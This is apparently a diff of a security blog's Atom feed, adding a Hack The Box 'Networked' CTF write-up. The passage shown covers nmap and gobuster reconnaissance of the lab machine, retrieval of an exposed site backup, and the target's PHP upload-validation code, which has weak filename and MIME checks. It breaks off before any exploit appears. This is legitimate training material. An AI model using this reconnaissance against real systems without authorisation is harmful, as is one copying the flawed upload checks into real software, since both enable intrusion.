@@ -1,4 +1,602 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-11-09T15:06:45+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Jarvis</title><link href="https://0xrick.github.io/hack-the-box/jarvis/" rel="alternate" type="text/html" title="Hack The Box - Jarvis" /><published>2019-11-09T00:00:00+02:00</published><updated>2019-11-09T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/jarvis</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/jarvis/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-11-16T16:52:04+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Networked</title><link href="https://0xrick.github.io/hack-the-box/networked/" rel="alternate" type="text/html" title="Hack The Box - Networked" /><published>2019-11-16T00:00:00+02:00</published><updated>2019-11-16T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/networked</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/networked/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Hey guys, today Networked retired and here’s my write-up about it. It was a quick fun machine with an &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; vulnerability and a couple of command injection vulnerabilities. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.146&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;networked.htb&lt;/code&gt;. Let’s jump right in !
+&lt;img src=&quot;/images/hackthebox/networked/0.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# nmap -sV -sT -sC -o nmapinitial networked.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 01:16 EET 
+Nmap scan report for networked.htb (10.10.10.146)
+Host is up (1.7s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+443/tcp closed https
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 147.70 seconds
+root@kali:~/Desktop/HTB/boxes/networked# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, let’s check the web service.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;The index page had nothing except for this message:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to check for sub directories and I found 2 interesting directories, &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploads&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# gobuster -u http://networked.htb/ -w /usr/share/wordlists/dirb/common.txt                                                                                                
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://networked.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/11/16 01:21:45 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/backup (Status: 301)
+/cgi-bin/ (Status: 403)
+/index.php (Status: 200)
+/uploads (Status: 301)
+=====================================================
+2019/11/16 01:24:26 Finished
+=====================================================
+root@kali:~/Desktop/HTB/boxes/networked# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup&lt;/code&gt; I found a &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; archive that had a backup of all the site’s pages:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# wget http://networked.htb/backup/backup.tar
+--2019-11-16 01:25:13--  http://networked.htb/backup/backup.tar
+Resolving networked.htb (networked.htb)... 10.10.10.146
+Connecting to networked.htb (networked.htb)|10.10.10.146|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10240 (10K) [application/x-tar]
+Saving to: ‘backup.tar’
+
+backup.tar                                           100%[=====================================================================================================================&amp;gt;]  10.00K  --.-KB/s    in 0.1s    
+
+2019-11-16 01:25:13 (95.3 KB/s) - ‘backup.tar’ saved [10240/10240]
+
+root@kali:~/Desktop/HTB/boxes/networked# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# mkdir backup
+root@kali:~/Desktop/HTB/boxes/networked# cd backup/
+root@kali:~/Desktop/HTB/boxes/networked/backup# mv ../backup.tar .
+root@kali:~/Desktop/HTB/boxes/networked/backup# tar xvf backup.tar 
+index.php
+lib.php
+photos.php
+upload.php
+root@kali:~/Desktop/HTB/boxes/networked/backup# ls -la
+total 36
+drwxr-xr-x 2 root root  4096 Nov 16 01:26 .
+drwxr-xr-x 3 root root  4096 Nov 16 01:25 ..
+-rw-r--r-- 1 root root 10240 Jul  9 13:33 backup.tar
+-rw-r--r-- 1 root root   229 Jul  9 13:33 index.php
+-rw-r--r-- 1 root root  2001 Jul  2 13:38 lib.php
+-rw-r--r-- 1 root root  1871 Jul  2 14:53 photos.php
+-rw-r--r-- 1 root root  1331 Jul  2 14:45 upload.php
+root@kali:~/Desktop/HTB/boxes/networked/backup# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+Hello mate, we're building the new FaceMash!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;
+Help by funding us and be the new Tyler&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;Cameron!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;
+Join us at the pool party this Sat to get a glimpse
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- upload and gallery not yet linked --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lib.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getnameCheck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;#echo &quot;name $name - ext $ext\n&quot;;
+&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getnameUpload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;//echo &quot;prefix: $prefix - fname: $filename&amp;lt;br&amp;gt;\n&quot;;
+&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FILTER_VALIDATE_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;4tt4ck on file &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;: prefix is not a valid ip &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;file_mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$regexp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;function_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'finfo_file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;finfo_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILEINFO_MIME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
+&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;finfo_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;finfo_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$regexp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;function_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mime_content_type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mime_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// It's possible that mime_content_type() returns FALSE or an empty string
+&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$mime_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'image/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
